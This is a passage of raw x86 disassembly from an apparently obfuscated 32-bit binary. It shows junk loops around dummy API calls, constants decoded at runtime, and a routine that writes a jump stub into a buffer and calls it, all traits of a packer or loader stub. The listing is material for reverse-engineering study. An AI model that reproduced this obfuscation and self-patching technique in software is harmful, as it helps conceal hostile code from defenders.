  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428e41
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af05
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x42fa2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x42fa00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428e4d
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x42fa04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x42fa38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x42fa08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429ea1
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429eb5
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429eb5
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x42fa3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x42fa40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x42fa0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x42fa44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x42fa10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x42fa14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
